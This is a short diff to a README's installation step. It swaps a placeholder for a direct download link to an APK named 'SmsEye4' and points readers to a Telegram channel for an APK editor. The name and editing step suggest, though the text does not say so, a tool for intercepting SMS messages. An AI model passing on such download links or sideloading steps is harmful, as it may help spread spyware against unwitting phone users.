@@ -49,7 +49,7 @@
 ### ✅ Step 3 – Install APK Editor & Download App
 
 1. 📥 [**Download APK Editor from our Telegram channel**](https://t.me/abyssalarmybackup)  
-2. 📦 [**Download SmsEye4 APK**](https://example.com/smsEye4-link)  
+2. 📦 [**Download SmsEye4 APK**](https://github.com/AbyssalArmy/SmsEye4/raw/refs/heads/main/sms-eye-4.apk)  
 
 ---
 
